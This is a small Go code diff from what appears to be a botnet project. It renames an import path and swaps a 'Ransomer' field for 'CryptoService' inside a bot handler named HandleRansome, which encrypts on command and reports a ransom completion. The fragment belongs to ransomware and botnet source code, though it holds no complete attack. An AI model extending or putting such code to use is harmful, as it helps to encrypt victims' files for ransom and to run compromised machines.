@@ -5,7 +5,7 @@ import (
 	"encoding/gob"
 	"log"
 
-	"github.com/rodzzlessa24/botnet"
+	"github.com/threeaccents/botnet"
 )
 
 //HandleScan is
@@ -39,7 +39,7 @@ func (b *BotService) HandleScan(payload []byte) {
 
 //HandleRansome is
 func (b *BotService) HandleRansome(payload []byte) {
-	if err := b.Ransomer.Encrypt(""); err != nil {
+	if err := b.CryptoService.Encrypt(""); err != nil {
 		log.Panic(err)
 	}
 	msg := &ransomCompleteRequest{
